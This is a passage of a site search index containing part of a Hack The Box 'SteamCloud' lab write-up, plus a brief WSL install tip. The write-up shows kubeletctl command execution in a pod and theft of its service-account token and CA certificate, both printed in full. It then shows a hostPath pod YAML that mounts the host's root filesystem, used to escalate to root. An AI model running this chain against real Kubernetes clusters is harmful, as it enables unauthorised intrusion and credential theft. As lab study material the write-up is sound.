\u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 1 \u2502 10.10.11.133 \u2502 kube-apiserver-steamcloud          \u2502 kube-system \u2502 kube-apiserver          \u2502 -   \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 2 \u2502              \u2502 storage-provisioner                \u2502 kube-system \u2502 storage-provisioner     \u2502 -   \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 3 \u2502              \u2502 kube-proxy-k8tsh                   \u2502 kube-system \u2502 kube-proxy              \u2502 +   \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 4 \u2502              \u2502 coredns-78fcd69978-xgmt7           \u2502 kube-system \u2502 coredns                 \u2502 -   \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 5 \u2502              \u2502 nginx                              \u2502 default     \u2502 nginx                   \u2502 +   \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 6 \u2502              \u2502 kube-controller-manager-steamcloud \u2502 kube-system \u2502 kube-controller-manager \u2502 -   \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 7 \u2502              \u2502 kube-scheduler-steamcloud          \u2502 kube-system \u2502 kube-scheduler          \u2502 -   \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 8 \u2502              \u2502 etcd-steamcloud                    \u2502 kube-system \u2502 etcd                    \u2502 -   \u2502\n\u2514\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>nginx and kube-proxy-k8tsh pods can execute code remotely, but kube-proxy-k8tsh is a pod for proxy.</p> <pre><code>\u2514\u2500$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 exec 'ls -la /var/run/secrets/kubernetes.io/serviceaccount/' -p nginx -c nginx\ntotal 4\ndrwxrwxrwt 3 root root  140 Feb 21 07:20 .\ndrwxr-xr-x 3 root root 4096 Feb 21 07:20 ..\ndrwxr-xr-x 2 root root  100 Feb 21 07:20 ..2024_02_21_07_20_02.874347555\nlrwxrwxrwx 1 root root   31 Feb 21 07:20 ..data -&gt; ..2024_02_21_07_20_02.874347555\nlrwxrwxrwx 1 root root   13 Feb 21 07:20 ca.crt -&gt; ..data/ca.crt\nlrwxrwxrwx 1 root root   16 Feb 21 07:20 namespace -&gt; ..data/namespace\nlrwxrwxrwx 1 root root   12 Feb 21 07:20 token -&gt; ..data/token\n\n\u2514\u2500$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 exec 'cat /var/run/secrets/kubernetes.io/serviceaccount/token' -p nginx -c nginx\neyJhbGciOiJSUzI1NiIsImtpZCI6IkNUUVE2ZFV6NXNoZEtWTGdYRDNQRU1FWXBnQ2RuQnBhZUo4YkNhelNrQVEifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzQwMDM2MDAyLCJpYXQiOjE3MDg1MDAwMDIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjJiMTk1Yjk2LWNiMTEtNDIyZi1iZDIwLTdlYTcyOTE3MmE5YSJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImU5NGVhYjcwLWJkMDctNDkyMS05YWE2LWRlMWUyZDYyNGIxMSJ9LCJ3YXJuYWZ0ZXIiOjE3MDg1MDM2MDl9LCJuYmYiOjE3MDg1MDAwMDIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.nNVM9EnSiwvvFEB5BM9T5IDpn3aFagsOMoWt_xVQRSfyHNmereRX_g8zgKBZg920LI-M9u-UgORmY1VnfboOUfh-J_kykUSgnOA1hBA9suStwGPZxBEVU4tWwQ7lDZWLKFNdLsizovMo4wg90M3JdkQCl5q-MjVVAjwLLRwoLs2_3W5YcVqzFvKUeBx2300zbFmhgi6WWZIt6QLI0nw4rXo7zMTzgC4-kptvxX_HYFGxzR9eti-xV0QtAdH5uaaSKtUP8ZVRF4j4mu3ctPuImybkKYS_5_5kif_YQ0uPN63Yj5_9BTr1KISYBGIYGz6gC8vV2bwXr1qd6B-CiPiWAw\n\n\u2514\u2500$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 exec 'cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt' -p nginx -c nginx\n-----BEGIN CERTIFICATE-----\nMIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p\na3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE\nAxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoa\nYRSqoSUfHaMBK44xXLLuFXNELhJrC/9O0R2Gpt8DuBNIW5ve+mgNxbOLTofhgQ0M\nHLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7M0X0QjPRB3Ug2cID7\ndeqATtnjZaXTk0VUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR1oxO9+mPo3ry6S2xqG\nVeeRhpK6Ma3FpJB3oN0Kz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll\nhnRBjBwFDdzQVeIJRKhSAhczDbKP64bNi2K1ZU95k5YkodSgXyZmmkfgYORyg99o\n1pRrbLrfNk6DE5S9VSUCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW\nMBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW\nBBSpRKCEKbVtRsYEGRwyaVeonBdMCjANBgkqhkiG9w0BAQsFAAOCAQEA0jqg5pUm\nlt1jIeLkYT1E6C5xykW0X8mOWzmok17rSMA2GYISqdbRcw72aocvdGJ2Z78X/HyO\nDGSCkKaFqJ9+tvt1tRCZZS3hiI+sp4Tru5FttsGy1bV5sa+w/+2mJJzTjBElMJ/+\n9mGEdIpuHqZ15HHYeZ83SQWcj0H0lZGpSriHbfxAIlgRvtYBfnciP6Wgcy+YuU/D\nxpCJgRAw0IUgK74EdYNZAkrWuSOA0Ua8KiKuhklyZv38Jib3FvAo4JrBXlSjW/R0\nJWSyodQkEF60Xh7yd2lRFhtyE8J+h1HeTz4FpDJ7MuvfXfoXxSDQOYNQu09iFiMz\nkf2eZIBNMp0TFg==\n-----END CERTIFICATE-----\n</code></pre> <pre><code>\u2514\u2500$ sudo kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 auth can-i --list\nResources                                       Non-Resource URLs                     Resource Names   Verbs\nselfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]\nselfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]\npods                                            []                                    []               [get create list]\n                                                [/.well-known/openid-configuration]   []               [get]\n                                                [/api/*]                              []               [get]\n                                                [/api]                                []               [get]\n                                                [/apis/*]                             []               [get]\n                                                [/apis]                               []               [get]\n                                                [/healthz]                            []               [get]\n                                                [/healthz]                            []               [get]\n                                                [/livez]                              []               [get]\n                                                [/livez]                              []               [get]\n                                                [/openapi/*]                          []               [get]\n                                                [/openapi]                            []               [get]\n                                                [/openid/v1/jwks]                     []               [get]\n                                                [/readyz]                             []               [get]\n                                                [/readyz]                             []               [get]\n                                                [/version/]                           []               [get]\n                                                [/version/]                           []               [get]\n                                                [/version]                            []               [get]\n                                                [/version]                            []               [get]\n\n</code></pre>"}, {"location": "HTB/Machines/SteamCloud/#yaml-file-used-to-deploy-a-new-pod", "title": ".yaml file used to deploy a new pod", "text": "<pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginxt\n  namespace: default\nspec:\n  containers:\n  - name: nginxt\n    image: nginx:1.14.2\n    volumeMounts:\n    - mountPath: /root\n      name: mount-root-into-mnt\n  volumes:\n  - name: mount-root-into-mnt\n    hostPath:\n      path: /\n  automountServiceAccountToken: true\n  hostNetwork: true\n</code></pre> <pre><code>\u2514\u2500$ sudo kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 apply -f deploy.yaml \npod/nginxt created\n\n\u2514\u2500$ sudo kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 get pods\nNAME     READY   STATUS    RESTARTS   AGE\nnginx    1/1     Running   0          73m\nnginxt   1/1     Running   0          59s\n\n\u2514\u2500$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 exec 'ls /root' -p nginxt -c nginxt\n\n</code></pre> <pre><code>\u2514\u2500$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 exec 'cat /root/home/user/user.txt' -p nginxt -c nginxt\n\n\u2514\u2500$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 exec 'cat /root/root/root.txt' -p nginxt -c nginxt\n</code></pre>"}, {"location": "Others/Use%20WSL%20to%20Install%20Ubuntu%20on%20Windows%2011/", "title": "Use WSL to Install Ubuntu on Windows 11", "text": ""}, {"location": "Others/Use%20WSL%20to%20Install%20Ubuntu%20on%20Windows%2011/#use-wsl-to-install-ubuntu-on-windows-11", "title": "Use WSL to Install Ubuntu on Windows 11", "text": "<ol> <li>Install WSL.<ul> <li>In the Windows Search bar, type \u201cturn Windows features on or off\u201d and then open the corresponding app.</li> <li>Scroll down to check the boxes in front of Virtual Machine Platform and Windows Subsystem for Linux. Then, click OK.</li> <li>Restart your computer when required. </li> </ul> </li> <li>Install ubuntu  <code>wsl --install -d ubuntu</code></li> </ol>"}]}